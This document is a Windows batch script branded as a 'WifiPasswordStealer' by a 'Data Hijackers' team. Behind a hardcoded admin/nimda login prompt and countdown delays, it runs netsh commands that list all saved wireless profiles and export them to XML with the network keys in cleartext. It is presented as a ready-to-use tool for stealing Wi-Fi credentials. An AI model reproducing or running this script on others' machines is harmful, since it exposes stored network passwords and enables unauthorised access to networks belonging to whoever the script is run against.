@echo off
:again
title WifePasswordStealer
mode 1000
color a
echo DON'T MOVE THE WifiPasswordStealer.bat FROM WifiPasswordStealer FOLDER 
echo ----------------------------------------- 
echo  Created By Data Hijackers Official Team 
echo -----------------------------------------                                                                   
echo Username:
set /p username=
if %username%==admin goto yes
if NOT %username%==admin goto wrong
:yes
echo Password:
set /p password=
if %password%==nimda goto correct
if NOT %password%==nimda goto wrong
:correct 
echo Starting....
echo 10
ping localhost -n 2 >nul
echo 9
ping localhost -n 2 >nul
echo 8
ping localhost -n 2 >nul
echo 7
ping localhost -n 2 >nul 
echo 6
ping localhost -n 2 >nul
echo 5
ping localhost -n 2 >nul
echo 4
ping localhost -n 2 >nul
echo 3
ping localhost -n 2 >nul
echo 2
ping localhost -n 2 >nul
echo 1
ping localhost -n 2 >nul
echo 0
netsh wlan show profiles 
echo 3
ping localhost -n 2 >nul
echo 2
ping localhost -n 2 >nul
echo 1
ping localhost -n 2 >nul
echo 0
netsh wlan export profile key=clear
echo 5
ping localhost -n 2 >nul
echo 4
ping localhost -n 2 >nul
echo 3
ping localhost -n 2 >nul
echo 2
ping localhost -n 2 >nul
echo 1
ping localhost -n 2 >nul
echo 0
ping localhost -n 2 >nul
echo All the wifi passwords are exported as XML you can open them on WINDOWS NOTEPAD.OPEN README.htlm TO FIND WHERE IS THE PASSWORD!
echo Exiting.....
ping localhost -n 2 >nul
echo 5
ping localhost -n 2 >nul
echo 4
ping localhost -n 2 >nul
echo 3
ping localhost -n 2 >nul
echo 2
ping localhost -n 2 >nul
echo 1
ping localhost -n 2 >nul 
echo 0
exit
:wrong
echo TRY AGAIN!
goto again
